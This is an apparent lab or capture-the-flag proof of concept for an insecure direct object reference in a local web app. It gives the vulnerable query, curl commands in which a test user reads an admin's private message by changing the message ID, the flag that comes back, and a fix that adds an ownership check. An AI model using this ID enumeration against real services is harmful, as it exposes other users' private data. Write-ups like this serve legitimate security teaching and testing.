# PoC 2 — Insecure Direct Object Reference (IDOR)

**Flag:** `FLAG{idor_cb8acad1b559}`

## Vulnerability

`/messages/<msg_id>` fetches a message by its numeric ID with no check
that the logged-in user actually owns that message:

```python
row = get_db().execute(
    "SELECT id, owner, title, body FROM messages WHERE id = ?", (msg_id,)
).fetchone()
```

## Exploit

Logged in as the public test account `alice / password123` (a normal,
low-privilege user — deliberately *not* admin, to prove the bug is
exploitable without any elevated access):

```bash
curl -s -i -c cookies_alice.txt -X POST http://127.0.0.1:5000/login \
  -d "username=alice&password=password123"
```

`/messages` as alice only lists her own messages `#4` and `#5`:

```html
<li><a href="/messages/4">#4 — Grocery list</a></li>
<li><a href="/messages/5">#5 — Vacation</a></li>
```

Message `#1` belongs to `admin` and is never linked to alice. Requesting
it directly by guessing/incrementing the ID still returns it:

```bash
curl -s -i -b cookies_alice.txt http://127.0.0.1:5000/messages/1
```

**Response body:**

```html
<h1>#1 — Onboarding secret</h1>
<p class="meta">To: admin</p>
<p>Internal only. Do not share. FLAG{idor_cb8acad1b559}</p>
```

alice, who has no relationship to that message, reads admin's private
message purely by changing a number in the URL.

## Remediation

Add an ownership check before returning the row:

```python
row = get_db().execute(
    "SELECT id, owner, title, body FROM messages WHERE id = ? AND owner = ?",
    (msg_id, user["username"]),
).fetchone()
```

Return 404 (not 403, to avoid confirming the ID exists) when the row
belongs to someone else.

**Severity:** High — any authenticated user can read any other user's
private messages by enumerating sequential IDs.
